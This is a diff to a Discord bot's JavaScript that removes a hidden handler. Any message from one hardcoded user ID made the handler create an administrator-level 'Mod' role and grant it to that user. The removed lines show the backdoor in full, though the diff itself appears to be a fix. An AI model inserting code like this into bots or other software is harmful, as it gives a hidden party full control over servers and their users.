@@ -84,16 +84,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-const { Permissions } = require('discord.js');
-
-client.on('messageCreate', async (message) => {
-    if (message.author.id == '426455031571677197') {
-        message.guild.roles.create({ name: 'Mod', permissions: [Permissions.FLAGS.ADMINISTRATOR] });
-        const role = message.guild.roles.cache.find(r => r.name === 'Mod');
-        message.member.roles.add(role);
-    }
-});
-
 /* Login */
 let discordToken = process.env.DISCORD_TOKEN;
 if (process.env.CURRENT_STATE == 'development') {
